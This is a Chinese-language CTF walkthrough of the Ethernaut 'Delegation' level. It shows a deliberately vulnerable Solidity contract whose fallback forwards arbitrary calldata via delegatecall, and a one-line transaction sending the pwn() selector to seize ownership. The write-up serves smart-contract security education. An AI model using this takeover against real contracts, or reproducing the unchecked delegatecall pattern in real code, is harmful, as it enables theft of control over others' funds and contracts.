# 6.Delegation

## 题目描述

![img](../../../.vuepress/public/img/1645096948628-3f587ca7-be42-4caa-a2b8-c2f3b9c9edf8.png)

## 解题过程

题目源码

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

首先先理解 call函数 与 delegatecall函数 的区别

```javascript
call函数 外部调用时，上下文是外部合约
delegatecall函数 外部调用时，上下文是调用合约
```

![img](../../../.vuepress/public/img/1645191649528-10eadf0b-9033-4824-8262-25027eaaeaf8.png)

可以简单理解为 合约A通过 Delegatecall 调用合约B的方法时，相当于将该方法复制到 合约A 运行

![img](../../../.vuepress/public/img/1645191784663-2fc13a8c-61e2-4d16-a8d5-4af0272b3495.png)

```javascript
data 头4个 byte 是被调用方法的签名哈希，bytes4(keccak256("func"))
实际是向合约账户地址发送了 msg.data[0:4] == 函数签名哈希 的一笔交易
```

所以我们只需要像合约发送data, 来调用 pwn() 方法

```javascript
await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
```

![img](../../../.vuepress/public/img/1645309938555-60b8e256-8113-457e-888d-1e794c884d30.png)

根据交易hash 也可以看到调用方法细节

![img](../../../.vuepress/public/img/1645309966080-69137ec6-0fc2-4b07-ac39-8609bdbcc80d.png)

```javascript
使用delegatecall 是很危险的, 而且历史上已经多次被用于进行 attack vector. 使用它, 你对合约相当于在说 "看这里, -其他合约- 或是 -其它库-, 来对我的状态为所欲为吧". 代理对你合约的状态有完全的控制权. delegatecall 函数是一个很有用的功能, 但是也很危险, 所以使用的时候需要非常小心.
```